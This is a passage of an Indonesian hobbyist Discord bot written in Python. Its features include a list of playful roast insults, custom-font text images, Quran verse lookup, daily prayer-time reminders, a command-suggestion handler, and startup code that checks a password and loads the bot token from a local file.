    "`@user, kamu tuh kayak grup WA keluarga—rame, tapi gak ada faedahnya.`",
    "`@user, kalau jadi app, kamu pasti butuh update tiap hari tapi tetep nge-lag.`",
    "`@user, tampangmu kayak file zip, kecil tapi isinya berat semua.`",
    "`@user, vibes kamu kayak baterai 1%—mau dimanfaatin aja orang males.`",
    "`@user, kalau lu jadi sinetron, pasti judulnya *“Anak Durhaka Gagal Update Otak.”*`",
    "`@user, lu tuh kayak file download-an gagal—udah nunggu lama, eh error juga.`",
    "`@user, otak lu kayak server gratis—down terus tiap dibutuhin.`",
    "`@user, kalo jadi emoji, lu tuh pasti 'buffering'.`",
    "`@user, IQ lu kayak koneksi WiFi publik—semua bisa pake, tapi nggak bisa diandalkan.`",
    "`@user, tiap kali lu ngomong, grammar dunia ikut menangis.`",
    "`@user, kalo jadi film, lu dapet rating 1 bintang dari netizen dan makhluk halus.`",
    "`@user, jokes kamu tuh kayak status Facebook 2010—garing, jadul, dan bikin malu.`"
]

# Command untuk roast
@bot.command()
async def roast(ctx, *, target=None):
    if not target:
        await ctx.send("Tag orang yang ingin diroast, contoh: !roast @user")
        return

    # Menentukan roast
    roast_text = random.choice(roast_list).replace('@user', target)

    # Mengirim roast
    try:
        await ctx.send(roast_text)
    except Exception as e:
        print(f"Error: {e}")
        await ctx.send("Terjadi kesalahan saat mengirim pesan.")
        
#sistem custom text
# Lokasi folder font
FONT_DIR = "./font"
OUTPUT_FILE = "output.png"

def generate_image(text, font_name):
    font_path = os.path.join(FONT_DIR, font_name)
    if not os.path.exists(font_path):
        return None

    font_size = 48
    font = ImageFont.truetype(font_path, font_size)

    image_width = 1000
    image_height = 200

    # Ubah background jadi putih dan teks jadi hitam
    img = Image.new("RGB", (image_width, image_height), color="white")
    draw = ImageDraw.Draw(img)
    draw.text((10, 50), text, font=font, fill="black")

    img.save(OUTPUT_FILE)
    return OUTPUT_FILE

@bot.command(name="customtext")
async def customtext(ctx, *, args):
    try:
        pesan, font = args.rsplit(" ", 1)
    except ValueError:
        await ctx.send("Format salah! Gunakan: `!customtext <pesan> <font>` (contoh: `!customtext halo v1.ttf`)")
        return

    if not font.startswith("v") or not font.endswith(".ttf"):
        await ctx.send("Format font harus seperti `v1.ttf` - `v20.ttf`")
        return

    try:
        number = int(font[1:-4])
        if number < 1 or number > 20:
            await ctx.send("Font hanya tersedia dari `v1.ttf` sampai `v20.ttf`")
            return
    except ValueError:
        await ctx.send("Nama font tidak valid. Gunakan `v1.ttf` - `v20.ttf`")
        return

    filepath = generate_image(pesan, font)
    if filepath is None:
        await ctx.send("Font tidak ditemukan.")
        return

    with open(filepath, "rb") as f:
        file = discord.File(f, filename="custom_text.png")
        embed = discord.Embed(
            title="Teks Custom Kamu",
            description=f"Font: **{font}**\nPesan: `{pesan}`",
            color=discord.Color.purple()
        )
        embed.set_image(url="attachment://custom_text.png")
        embed.set_footer(text="Generated by Hazelnut Bot")
        await ctx.send(embed=embed, file=file)

@bot.command(name="listfont")
async def listfont(ctx):
    if not os.path.exists(FONT_DIR):
        await ctx.send("Folder font tidak ditemukan.")
        return

    fonts = [f for f in os.listdir(FONT_DIR) if f.endswith(".ttf")]
    if not fonts:
        await ctx.send("Tidak ada file font .ttf ditemukan.")
        return

    font_list = "\n".join(f"`{f}`" for f in sorted(fonts))
    embed = discord.Embed(
        title="Daftar Font Tersedia",
        description=font_list,
        color=discord.Color.green()
    )
    embed.set_footer(text="Gunakan font ini dengan !customtext <pesan> <font>")
    await ctx.send(embed=embed)
        
# Perintah untuk mencari ayat
@bot.command()
async def surah(ctx, surah: int, ayat: int):
    if not surah or not ayat or not isinstance(surah, int) or not isinstance(ayat, int):
        await ctx.send("Format tidak valid. Pastikan Anda memasukkan angka untuk surah dan ayat.")
        return

    try:
        # URL API untuk mendapatkan data ayat dari Al-Qur'an
        url = f"https://www.velyn.biz.id/api/search/alquran?surah={surah}&ayat={ayat}"
        response = requests.get(url)

        if response.status_code != 200:
            await ctx.send(f"Gagal mengambil data. Status: {response.status_code}")
            return

        data = response.json()

        if not data or not data.get('text'):
            await ctx.send("Data tidak ditemukan atau format tidak valid.")
            return

        # Membuat embed untuk menampilkan hasil
        embed = discord.Embed(
            title=f"📖 *Surah {data['surah_nama']} ({surah}), Ayat {ayat}*",
            description=data['text'],
            color=discord.Color.blue()
        )
        embed.add_field(name="📜 Terjemahan", value=data['translation'], inline=False)
        embed.add_field(name="📝 Tafsir Singkat", value=data['tafsir'], inline=False)
        embed.add_field(name="📌 Informasi Tambahan", value=(
            f"- *Nama Surah:* {data['surah_nama']}\n"
            f"- *Nomor Surah:* {data['surah']}\n"
            f"- *Nomor Ayat:* {data['ayat']}\n"
            f"- *Revelasi:* {data['revelation_place']}\n"
            f"- *Jumlah Ayat dalam Surah:* {data['surah_total_ayat']}\n"
            f"- *Tafsir Lengkap:* {data['tafsir_lengkap']}"
        ), inline=False)

        # Mengirim embed ke channel Discord
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Terjadi kesalahan saat mengambil data ayat: {str(e)}")
        
#sistem command not found
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        # Dapatkan daftar semua perintah yang tersedia
        commands_list = [command.name for command in bot.walk_commands()]
        
        # Dapatkan perintah yang paling mendekati menggunakan difflib
        command = ctx.message.content[1:].lower()  # Menghapus prefix dan mengubah menjadi huruf kecil
        closest_match = difflib.get_close_matches(command, commands_list, n=1)
        
        if closest_match:
            # Jika ada perintah yang mendekati, kirimkan saran
            suggestion = closest_match[0]
            similarity_percentage = int(difflib.SequenceMatcher(None, command, suggestion).ratio() * 100)

            embed = discord.Embed(
                title="⚠️ Perintah Tidak Ditemukan!",
                description=f"Apakah kamu maksud `{suggestion}`? ({similarity_percentage}%)",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="⚠️ Perintah Tidak Ditemukan!",
                description="Perintah yang kamu cari tidak ditemukan.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
#sistem shalat
KOTA = "jakarta"

async def jadwal_shalat_rutin():
    await bot.wait_until_ready()

    while not bot.is_closed():
        now = datetime.now()
        target = now.replace(hour=4, minute=30, second=0, microsecond=0)

        if now > target:
            target = target.replace(day=now.day + 1)

        wait_time = (target - now).total_seconds()
        await asyncio.sleep(wait_time)

        try:
            today = datetime.now().strftime("%Y/%m/%d")
            url = f"https://api.myquran.com/v1/sholat/jadwal/{KOTA}/{today}"
            data = requests.get(url).json()

            if not data.get("status"):
                continue

            info = data["data"]
            jadwal = info["jadwal"]

            for guild in bot.guilds:
                # ambil user random buat ditag
                members = [m for m in guild.members if not m.bot]
                random_user = random.choice(members) if members else None

                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).send_messages:
                        embed = discord.Embed(
                            title=f"Jadwal Shalat Hari Ini - {info['lokasi'].title()}",
                            description=f"Tanggal: **{jadwal['tanggal']}**",
                            color=discord.Color.gold()
                        )
                        embed.add_field(name="🕓 Imsak", value=jadwal['imsak'], inline=True)
                        embed.add_field(name="🌅 Subuh", value=jadwal['subuh'], inline=True)
                        embed.add_field(name="🏙️ Dzuhur", value=jadwal['dzuhur'], inline=True)
                        embed.add_field(name="🌇 Ashar", value=jadwal['ashar'], inline=True)
                        embed.add_field(name="🌆 Maghrib", value=jadwal['maghrib'], inline=True)
                        embed.add_field(name="🌃 Isya", value=jadwal['isya'], inline=True)
                        embed.set_footer(text="Auto reminder by Hazelnut Bot")

                        if random_user:
                            await channel.send(f"{random_user.mention} jangan lupa shalat yaaa!", embed=embed)
                        else:
                            await channel.send("Jangan lupa shalat yaa!", embed=embed)
                        break
        except Exception as e:
            print(f"Error: {e}")
                                 
# === Event_ready ===
start_time = datetime.now()
ram = psutil.virtual_memory().percent
cpu = platform.processor() or "Unknown CPU"
    
def get_sistem_update():
    file_path = './database/update.env'
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            return file.read().strip()  # Membaca isi file dan menghapus spasi atau baris kosong
    else:
        return "Update file tidak ditemukan."

def get_ip_address():
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=10)
        response.raise_for_status()
        ip_data = response.json()
        return ip_data.get('ip', 'Unknown IP')
    except requests.exceptions.RequestException as e:
        return f"Error: {str(e)}"
        
def about():
    kecepatan = hazel_speed_test()
    ip_address = get_ip_address()
    ram = psutil.virtual_memory().percent
    sistem_update=get_sistem_update()
    banner = f"""{Fore.CYAN}
██╗░░██╗██╗░░░██╗███╗░░██╗░█████╗░██████╗░░█████╗░
╚██╗██╔╝╚██╗░██╔╝████╗░██║██╔══██╗██╔══██╗██╔══██╗
░╚███╔╝░░╚████╔╝░██╔██╗██║██║░░██║██████╔╝███████║
░██╔██╗░░░╚██╔╝░░██║╚████║██║░░██║██╔══██╗██╔══██║
██╔╝╚██╗░░░██║░░░██║░╚███║╚█████╔╝██║░░██║██║░░██║
╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝          
              {Fore.MAGENTA}✧ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴀɴᴛᴀʀᴛɪᴄᴀ-ꜱᴇʀᴠᴇʀ ✧
    """
    print(banner)
    
    print(Fore.WHITE + f"╔═════════════════════ INFORMASI ══════════════════════╗")
    print(Fore.WHITE + f"║ 📅 Update       : {sistem_update}")
    print(Fore.WHITE + f"║ 🐍 Python       : {platform.python_version()}")
    print(Fore.WHITE + f"║ 🖥️ OS            : {platform.system()}")
    print(Fore.WHITE + f"║ ⚡ Powered      : Antartica-Server")
    print(Fore.WHITE + f"║ 🤖 Bot Name     : X Y N O R A")
    print(Fore.WHITE + f"║ ✅ Status Bot   : 🟢 Aktif")
    print(Fore.WHITE + "╚════════════════════════════════════════════════════╝")
    print(Fore.WHITE + f"╔════════════════════ DEVELOPER ═════════════════════╗")
    print(Fore.WHITE + f"║ 👤 Author       : Hazelnut")
    print(Fore.WHITE + f"║ 📱 WhatsApp     : +6285183131924")
    print(Fore.WHITE + f"║ 🎵 TikTok       : @stc_fay")
    print(Fore.WHITE + f"║ 📸 Instagram    : @stc_ryzzz")
    print(Fore.WHITE + f"║ 🛡️ Team          : Coding Jawascript")
    print(Fore.WHITE + "╚════════════════════════════════════════════════════╝")
    print(Fore.WHITE + f"╔═════════════════════ SERVER ═══════════════════════╗")
    print(Fore.WHITE + f"║ ⚙️ Ip address    : {ip_address}")
    print(Fore.WHITE + f"║ 💾 Ram usage    : {ram}%")
    print(Fore.WHITE + f"║ ⚙️ Cpu usage     : {cpu}")
    print(Fore.WHITE + f"║ 🛜 Latency      : {kecepatan:.2f}mbps")
    print(Fore.WHITE + "╚════════════════════════════════════════════════════╝")

# ========== CEK PASSWORD SAAT AWAL ==========
with open("./database/password.env") as f:
    stored_password = f.read().strip()

input_password = getpass.getpass("Masukkan password bot: ")

if input_password != stored_password:
    print(Fore.RED + "❌ Password salah! Bot tidak dijalankan.")
    exit()

# ========== BOT SETUP ==========
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@tasks.loop(seconds=1)
async def jadwal_loop():
    print("Jadwal loop berjalan setiap detik!")

async def jadwal_shalat_rutin():
    while True:
        print("Cek jadwal shalat...")
        await asyncio.sleep(60)

def about():
    print(Fore.CYAN + "Bot aktif dengan fitur jadwal dan ping.")

@bot.event
async def on_ready():
    print(Fore.GREEN + f"✅ Bot nyala sebagai {bot.user}")
    about()
    if not jadwal_loop.is_running():
        jadwal_loop.start()
    bot.loop.create_task(jadwal_shalat_rutin())

@bot.event
async def on_disconnect():
    print(Fore.RED + '❌ Bot terputus.')

@bot.event
async def on_error(event, *args, **kwargs):
    print(Fore.RED + f"⚠️ Terjadi error di event: {event}")
    traceback.print_exc()

@bot.command()
async def ping(ctx):
    await ctx.send(f"🏓 Pong! Latency: {round(bot.latency * 1000)}ms")

# ========== LOAD TOKEN ==========
with open("./database/token.env") as f:
    token = f.read().strip()

# ========== AUTO RECONNECT ==========
async def start_bot():
    while True:
        try:
            await bot.start(token)
        except Exception as e:
            print(Fore.RED + "‼️ Bot error/crash:")
            traceback.print_exc()
            print(Fore.YELLOW + "🔁 Reconnecting dalam 5 detik...")
            await asyncio.sleep(5)

# ========== JALANKAN ==========
try:
    asyncio.run(start_bot())
except KeyboardInterrupt:
    print(Fore.YELLOW + "⛔ Bot dihentikan manual (Ctrl+C).")